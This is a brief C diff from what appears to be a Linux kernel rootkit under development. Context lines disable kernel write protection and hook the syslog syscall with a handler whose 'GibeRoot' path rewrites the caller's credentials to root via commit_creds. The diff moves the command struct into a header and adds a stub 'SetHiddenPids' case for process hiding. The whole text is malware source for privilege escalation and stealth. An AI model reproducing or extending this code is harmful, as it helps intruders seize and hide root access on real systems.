@@ -27,6 +27,7 @@
 
 #include "sysmap.h"
 #include "proc_internal.h"
+#include "ccc.h"
 
 void disable_ro(void)
 {
@@ -39,16 +40,6 @@ void enable_ro(void)
     write_cr0(read_cr0() | X86_CR0_WP);
     barrier();
 }
-
-typedef struct
-{
-    enum {
-        GibeRoot,
-    } cmd;
-    union {
-        // todo
-    } payload;
-} CCC;
 
 #define FFF(x) ((typeof(& x )) SM_##x )
 
@@ -73,6 +64,9 @@ asmlinkage int fake_syslog(int type, char __user* buf, int len)
 		new->user = FFF(alloc_uid)(kuid);
 		new->fsuid = new->euid = kuid;
 		commit_creds(new);
+		break;
+	    case SetHiddenPids:
+		
 		break;
 	    default:
 		return -42;
